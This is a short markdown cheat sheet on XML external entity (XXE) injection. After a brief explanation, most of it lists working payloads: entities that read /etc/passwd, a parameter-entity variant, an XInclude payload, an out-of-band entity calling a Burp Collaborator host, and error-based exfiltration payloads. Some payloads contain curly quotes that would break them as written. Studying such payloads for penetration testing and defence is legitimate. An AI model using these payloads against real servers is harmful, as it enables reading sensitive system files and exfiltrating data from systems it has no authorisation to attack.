# XXE

XXE  stands for XML eXternal Entity  


-  html is used to display web pages and xml is used to store and transport data between websites, mobile applications and many more.
-  xxe injection is a subtype of xml injection where an attacker can inject their external entity to server xml parser and then can access sensitive files on server 


## Techniques to exploit XXE injection

### Simple payload:- 
		
            <?xml version="1.0" encoding="UTF-8"?> 
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM “file:///etc/passwd”>] >
            <foo>&xxe;</foo>


### Parameter Entity Payload: - 

This is a parameter entity which we can call anywhere no need to call in element . It is used to bypass restriction where external entites are not allowed to call in elements.
			
              <!DOCTYPE foo [<!ENTITY % xxe SYSTEM “file:///etc/passwd”>] >
              %xxe;																						



### Namespace Payload : - 
	
This is payload which we can use when external doctype is not allowed.
	
          <foo xmlns:namespace_name="http://www.w3.org/2001/XInclude">  <namespace_name:include parse="text"       href="file:///etc/passwd"/> </foo>



  ### SVG file upload : - 
  
  We can also try for xxe in file upload where svg files are allowed to upload.
  
  
  ### Blind or Out of Band interaction : - 
  
  We can try sending payload which it can make interaction to our server. 
  Example:   <!ENTITY xxe SYSTEM “http://burpcollaborator.com/”> 
  
  
  ### Error Messages : - 
  
  Verbose Error messages like File not found exception in xml . We can try giving non-existent file path with our own non files that could reflect error of file name with data .
  
          
          <!DOCTYPE foo [<!ENTITY % xxe SYSTEM “file:///etc/passwd”>]>
          <!ENTITY % exfil SYSTEM “file://non-existed/file/%xxe;”>
          %exfil;
  
  If this payload don't work then we can try for different payloads
  
            <!DOCTYPE foo [<!ENTITY % xxe SYSTEM “file:///etc/passwd”>]>
            <!ENTITY % data '<!ENTITY %(in html encoded) exfil SYSTEM “file://non-existed/file/%xxe;”>' >
            %data;
            %exfil;
  
  
  Using Local DTD ( when external document is not allowed) :- 
  
  we try to overwrite the internal dtd of the server 
  

  
